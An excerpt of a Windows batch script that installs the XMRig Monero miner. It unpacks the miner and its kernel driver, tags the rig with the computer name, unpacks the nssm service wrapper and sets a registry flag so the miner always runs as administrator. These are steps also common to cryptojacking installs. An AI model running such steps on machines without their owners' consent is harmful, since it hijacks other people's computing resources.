...
echo [*] XMRig log file %LOGFILE%.

echo.
echo [*] This host has %NUMBER_OF_PROCESSORS% CPU threads, so projected xmrig hashrate is around %EXP_MONERO_HASHRATE% KH/s.
echo.
...
if errorlevel 1 (
  ...
  "%USERPROFILE%\7za.exe" e -y  "%USERPROFILE%\xmrig.zip" -o"%USERPROFILE%\XMRig" "xmrig.exe" "WinRing0x64.sys" -r >NUL
...
powershell -Command "$out = cat '%USERPROFILE%\XMRig\config.json' | %%{$_ -replace '\"rig-id\": *null,', '\"rig-id\": \"%computername%\",'} | Out-String; $out | Out-File -Encoding ASCII '%USERPROFILE%\XMRig\config.json'" 
...
echo [*] Unpacking "%USERPROFILE%\nssm.zip" to "%USERPROFILE%\XMRig"
  "%USERPROFILE%\7za.exe" e -y -o"%USERPROFILE%\XMRig" "%USERPROFILE%\nssm.zip" >NUL
  if errorlevel 1 (
...
powershell -Command "New-ItemProperty -Path 'HKCU:\Software\Microsoft\Windows NT\CurrentVersion\AppCompatFlags\Layers' -Name $ENV:userprofile\XMRig\xmrig.exe -PropertyType String -Value RUNASADMIN"
